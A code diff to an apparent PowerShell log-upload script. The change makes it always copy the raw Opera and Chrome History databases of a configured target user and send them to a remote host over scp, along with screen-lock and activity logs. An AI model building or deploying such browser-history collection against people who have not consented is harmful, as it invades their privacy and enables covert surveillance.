@@ -8,6 +8,9 @@
     - all error logs (errors.log / *error*.log, plus Get-ErrorLogPath)
     - unlocked-time-summary.csv
     - state.json
+    - raw browser History DBs as log-history-* (staged shared-read copies
+      of Opera/Chrome History; also any non-.csv log-history-* already under
+      LogDirectory)
 
   Uses the same OpenSSH scp options as Scp-OnLock.ps1 (key auth, BatchMode).
   Does not require a screen lock; use -Force when ScpOnLockEnabled is false.
@@ -361,19 +364,23 @@ try {
             $fileList.Add([string]$f)
         }
     }
-    if (-not [string]::IsNullOrWhiteSpace([string]$cfg.TargetUsername)) {
-        $bHistoryStaged = @(New-ScpBHistoryUploadFiles -TargetUsername ([string]$cfg.TargetUsername) |
-            Where-Object { -not [string]::IsNullOrWhiteSpace([string]$_) })
-        if ($bHistoryStaged.Count -gt 0) {
-            foreach ($staged in $bHistoryStaged) {
-                $fileList.Add([string]$staged)
-            }
-            Write-Check -Name 'BHistory' -Ok $true -Detail ($bHistoryStaged -join '; ')
+    # Always stage raw History DBs (log-history-op / log-history-ch, …).
+    $bHistoryStaged = @(New-ScpBHistoryUploadFiles -TargetUsername ([string]$cfg.TargetUsername) |
+        Where-Object { -not [string]::IsNullOrWhiteSpace([string]$_) })
+    if ($bHistoryStaged.Count -gt 0) {
+        foreach ($staged in $bHistoryStaged) {
+            $fileList.Add([string]$staged)
+        }
+        Write-Check -Name 'BHistory (raw log-history-*)' -Ok $true -Detail ($bHistoryStaged -join '; ')
+    }
+    else {
+        $bhDetail = if ([string]::IsNullOrWhiteSpace([string]$cfg.TargetUsername)) {
+            'not found (TargetUsername empty; preferred History paths missing/unreadable)'
         }
         else {
-            Write-Check -Name 'BHistory' -Ok $true -Status WARN -Detail (
-                "not found or unreadable for '{0}'" -f $cfg.TargetUsername)
+            "not found or unreadable for '{0}'" -f $cfg.TargetUsername
         }
+        Write-Check -Name 'BHistory (raw log-history-*)' -Ok $true -Status WARN -Detail $bhDetail
     }
     $files = @($fileList | Where-Object { -not [string]::IsNullOrWhiteSpace([string]$_) })
     if ($files.Count -eq 0) {
